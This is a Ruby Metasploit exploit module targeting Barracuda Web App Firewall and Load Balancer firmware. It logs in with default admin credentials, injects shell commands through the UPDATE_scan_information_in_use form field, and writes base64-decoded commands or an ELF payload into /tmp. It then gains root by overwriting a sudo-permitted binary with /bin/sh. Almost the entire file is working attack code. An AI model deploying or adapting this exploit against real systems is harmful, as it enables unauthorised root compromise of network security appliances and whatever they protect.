# Date: 07/28/16
# Exploit Author: xort xort@blacksecurity.org
# Vendor Homepage: https://www.barracuda.com/
# Software Link: https://www.barracuda.com/products/loadbalance & https://www.barracuda.com/products/webapplicationfirewall
# Version: Load Balancer Firmware <= v5.4.0.004 (2015-11-26) & Web App Firewall Firmware <= 8.0.1.008 (2016-03-22)
# Tested on: Load Balancer Firmware <= v5.4.0.004 (2015-11-26) & Web App Firewall Firmware <= v8.0.1.008 (2016-03-22)
# CVE : None.
 
# vuln: UPDATE_va_other_options trigger exploit
 
require &#039;msf/core&#039;
 
class MetasploitModule < Msf::Exploit::Remote
    Rank = ExcellentRanking
    include  Exploit::Remote::Tcp
        include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Barracuda Web App Firewall/Load Balancer Post Auth Remote Root Exploit (3)&#039;,
                    &#039;Description&#039;    => %q{
                This module exploits a remote command execution vulnerability in the Barracuda Web App Firewall
                Firmware Version <= 8.0.1.008 and Load Balancer Firmware <= v5.4.0.004 by exploiting a vulnerability 
                in the web administration interface. By sending a specially crafted request it&#039;s possible to inject 
                system commands while escalating to root do to relaxed sudo configurations on the applianaces.  
            },
            &#039;Author&#039;         =>
                [
                    &#039;xort&#039;, # vuln + metasploit module
                ],
            &#039;Version&#039;        => &#039;$Revision: 2 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;none&#039;, &#039;none&#039;],
                ],
            &#039;Platform&#039;      => [ &#039;linux&#039;],
            &#039;Privileged&#039;     => true,
             &#039;Arch&#039;          => [ ARCH_X86 ],
                        &#039;SessionTypes&#039;  => [ &#039;shell&#039; ],
                        &#039;Privileged&#039;     => false,
 
                &#039;Payload&#039;        =>
                                { 
                                  &#039;Compat&#039; =>
                                  {
                                        &#039;ConnectionType&#039; => &#039;find&#039;,
                                  }
                                },
 
            &#039;Targets&#039;        =>
                [
                                        [&#039;Barracuda Web App Firewall Firmware Version <= 8.0.1.008 (2016-03-22)&#039;,
                                                {
                                                                &#039;Arch&#039; => ARCH_X86,
                                                                &#039;Platform&#039; => &#039;linux&#039;,
                                                                &#039;SudoCmdExec&#039; => "/home/product/code/firmware/current/bin/config_agent_wrapper.pl"
                                                }
                                        ],
 
                                        [&#039;Barracuda Load Balancer Firmware <= v5.4.0.004 (2015-11-26)&#039;,
                                                {
                                                                &#039;Arch&#039; => ARCH_X86,
                                                                &#039;Platform&#039; => &#039;linux&#039;,
                                                                &#039;SudoCmdExec&#039; => "/home/product/code/firmware/current/bin/rdpd"
                                                }
                                        ],
                                ],
 
                        &#039;DefaultTarget&#039; => 0))
 
            register_options(
                [
                    OptString.new(&#039;PASSWORD&#039;, [ false, &#039;Device password&#039;, "" ]),    
                    OptString.new(&#039;ET&#039;, [ false, &#039;Device password&#039;, "" ]),
                        OptString.new(&#039;USERNAME&#039;, [ true, &#039;Device password&#039;, "admin" ]),    
                    OptString.new(&#039;CMD&#039;, [ false, &#039;Command to execute&#039;, "" ]),  
                    Opt::RPORT(8000),
                ], self.class)
    end
 
        def do_login(username, password_clear, et)
                vprint_status( "Logging into machine with credentials...\n" )
 
                # vars
                timeout = 1550;
                enc_key = Rex::Text.rand_text_hex(32)
 
                # send request  
                res = send_request_cgi(
                {
                      &#039;method&#039;  => &#039;POST&#039;,
                      &#039;uri&#039;     => "/cgi-mod/index.cgi",
              &#039;headers&#039; => 
            {
                &#039;Accept&#039; => "application/json, text/javascript, */*; q=0.01",
                &#039;Content-Type&#039; => "application/x-www-form-urlencoded",
                &#039;X-Requested-With&#039; => "XMLHttpRequest"
            },
                      &#039;vars_post&#039; =>
                        {
 
                          &#039;enc_key&#039; => enc_key,
                          &#039;et&#039; => et,
                          &#039;user&#039; => "admin", # username,
                          &#039;password&#039; => "admin", # password_clear,
                          &#039;enctype&#039; => "none",
                          &#039;password_entry&#039; => "",
              &#039;login_page&#039; => "1",
                          &#039;login_state&#039; => "out",
                          &#039;real_user&#039; => "",
                          &#039;locale&#039; => "en_US",
                          &#039;form&#039; => "f",
                          &#039;Submit&#039; => "Sign in",
                        }
                }, timeout)
 
                # get rid of first yank 
                password = res.body.split(&#039;\n&#039;).grep(/(.*)password=([^&]+)&/){$2}[0] #change to match below for more exact result
                et = res.body.split(&#039;\n&#039;).grep(/(.*)et=([^&]+)&/){$2}[0]
 
                return password, et
        end
 
    def run_command(username, password, et, cmd)
        vprint_status( "Running Command...\n" )
 
        # file to replace
        sudo_cmd_exec = target[&#039;SudoCmdExec&#039;]
                #sudo_cmd_exec = "/home/product/code/firmware/current/bin/config_agent_wrapper.pl"
                #sudo_cmd_exec = "/home/product/code/firmware/current/bin/rdpd"
 
                sudo_run_cmd_1 = "sudo /bin/cp /bin/sh #{sudo_cmd_exec} ; sudo /bin/chmod +x #{sudo_cmd_exec}"
                sudo_run_cmd_2 = "sudo #{sudo_cmd_exec} -c "
 
                # random filename to dump too + &#039;tmp&#039; HAS to be here.
                b64dumpfile = "/tmp/" + rand_text_alphanumeric(4+rand(4))
 
        vprint_status(" file = " + b64dumpfile)
 
                # decoder stubs - tells &#039;base64&#039; command to decode and dump data to temp file
                b64decode1 = "echo \""
                b64decode2 = "\" | base64 -d >" + b64dumpfile
 
                # base64 - encode with base64 so we can send special chars and multiple lines
                cmd = Base64.strict_encode64(cmd)
 
                # Create injection string.
                #      a) package the  base64 decoder with encoded bytes
                #      b) attach a chmod +x request to make the script created (b64dumpfile) executable
                #      c) execute decoded base64 dumpfile
 
                injection_string = b64decode1 + cmd + b64decode2 + "; /bin/chmod +x " + b64dumpfile + "; " + sudo_run_cmd_1 + "; " + sudo_run_cmd_2 + b64dumpfile # + " ; rm " + b64dumpfile
 
        exploitreq = [
        [ "auth_type","Local" ],
        [ "et",et ],
        [ "locale","en_US" ],
        [ "password", password  ],
        [ "primary_tab", "ADVANCE" ],
        [ "realm","" ],
        [ "secondary_tab","advanced_system" ],
        [ "user", username ],
        [ "timestamp", Time.now.to_i ],
 
        [ "UPDATE_va_other_options", "1" ],
        [ "UPDATE_scan_information_in_use", "xx; #{injection_string}" ] # vuln
 
        ]
         
        boundary = "---------------------------" + Rex::Text.rand_text_numeric(34)
 
        post_data = ""
     
        exploitreq.each do |xreq|
            post_data << "--#{boundary}\r\n"
            post_data << "Content-Disposition: form-data; name=\"#{xreq[0]}\"\r\n\r\n"
            post_data << "#{xreq[1]}\r\n"
        end
            post_data << "--#{boundary}--\r\n"
 
            res = send_request_cgi({
               &#039;method&#039; => &#039;POST&#039;,
               &#039;uri&#039;    => "/cgi-mod/index.cgi",
               &#039;ctype&#039;  => "multipart/form-data; boundary=#{boundary}",
                   &#039;data&#039;   => post_data,
           &#039;headers&#039; => 
            {
                &#039;UserAgent&#039; => "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0",
            }
            })  
 
    end
 
    def run_script(username, password, et, cmds)
        vprint_status( "running script...\n")
       
       
    end
     
    def exploit
        # timeout
        timeout = 1550;
 
        user = "admin"
         
        # params
                real_user = "";
        login_state = "out"
        et = Time.now.to_i
        locale = "en_US"
        user = "admin"
        password = "admin"
        enctype = "MD5"
        password_entry = ""
        password_clear = "admin"
         
        if not datastore[&#039;PASSWORD&#039;].nil? and not datastore[&#039;PASSWORD&#039;].empty?
 
            password_clear = datastore[&#039;PASSWORD&#039;]
            password = datastore[&#039;PASSWORD&#039;]
#           et = datastore[&#039;ET&#039;] 
        end
 
        password_hash, et = do_login(user, password_clear, et)
        vprint_status("new password: #{password_hash} et: #{et}\n")
 
        sleep(5)
 
 
         #if no &#039;CMD&#039; string - add code for root shell
                if not datastore[&#039;CMD&#039;].nil? and not datastore[&#039;CMD&#039;].empty?
 
                        cmd = datastore[&#039;CMD&#039;]
 
                        # Encode cmd payload
                        encoded_cmd = cmd.unpack("H*").join().gsub(/(\w)(\w)/,&#039;\\x\1\2&#039;)
 
                        run_command(user, password_hash, et, ("sudo /bin/rm -f /tmp/n ;printf \"#{encoded_cmd}\" > /tmp/n; chmod +rx /tmp/n ; /tmp/n" ))
                else
                        # Encode payload to ELF file for deployment
                        elf = Msf::Util::EXE.to_linux_x86_elf(framework, payload.raw)
                        encoded_elf = elf.unpack("H*").join().gsub(/(\w)(\w)/,&#039;\\x\1\2&#039;)
 
                        run_command(user, password_hash, et, ("printf \"#{encoded_elf}\" > /tmp/m; chmod +rx /tmp/m ; /tmp/m" ))
                        handler
                end
 
 
    end
 
end

